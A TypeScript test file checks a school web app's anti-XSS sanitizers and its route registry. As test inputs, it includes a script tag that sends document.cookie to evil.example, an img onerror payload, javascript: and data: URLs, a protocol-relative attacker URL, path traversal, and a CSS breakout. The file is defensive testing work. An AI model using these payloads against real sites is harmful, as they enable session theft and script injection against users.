import { describe, expect, test } from 'bun:test';
import { isKnownSpaPath, parseExplicitErrorRoute } from './routes';
import {
  sanitizeAssetUrl,
  sanitizeHexColor,
  sanitizePlainText,
} from './sanitize';

describe('Anti-XSS Sanitizers & Error Route Registry', () => {
  test('sanitizePlainText strips script blocks, event-handler tags, and control bytes', () => {
    const dirty =
      '<script>fetch("https://evil.example?c="+document.cookie)</script>SMPN 1 <img src=x onerror=alert(1)>Gedeg\u0000';
    expect(sanitizePlainText(dirty, 80)).toBe('SMPN 1 Gedeg');
  });

  test('sanitizeAssetUrl blocks javascript:, data:text/html, and protocol-relative URLs', () => {
    expect(sanitizeAssetUrl('javascript:alert(1)', '/fallback.svg')).toBe('/fallback.svg');
    expect(sanitizeAssetUrl('data:text/html,<script>alert(1)</script>', '')).toBe('');
    expect(sanitizeAssetUrl('//attacker.example/logo.png', '')).toBe('');
    expect(sanitizeAssetUrl('/uploads/../secret', '')).toBe('');
    expect(sanitizeAssetUrl('/brand/svc-crest-color.svg', '')).toBe(
      '/brand/svc-crest-color.svg'
    );
    expect(
      sanitizeAssetUrl('https://is3-storage.smage.my.id/svc-media/logos/a.png', '')
    ).toBe('https://is3-storage.smage.my.id/svc-media/logos/a.png');
  });

  test('sanitizeHexColor blocks CSS style-attribute breakouts', () => {
    expect(sanitizeHexColor('#f59e0b; background-image:url(javascript:1)')).toBe('#E09D17');
    expect(sanitizeHexColor('#3B82F6')).toBe('#3B82F6');
  });

  test('SPA route registry recognizes valid routes, error routes, and flags unknown URLs for 404', () => {
    expect(isKnownSpaPath('/')).toBe(true);
    expect(isKnownSpaPath('/bagan')).toBe(true);
    expect(isKnownSpaPath('/back-office/media')).toBe(true);
    expect(isKnownSpaPath('/error/503')).toBe(true);
    expect(parseExplicitErrorRoute('/error/403')).toBe(403);
    expect(parseExplicitErrorRoute('/error/503')).toBe(503);
    expect(parseExplicitErrorRoute('/error/offline')).toBe('offline');
    expect(isKnownSpaPath('/halaman-ngawur-tidak-ada')).toBe(false);
  });
});
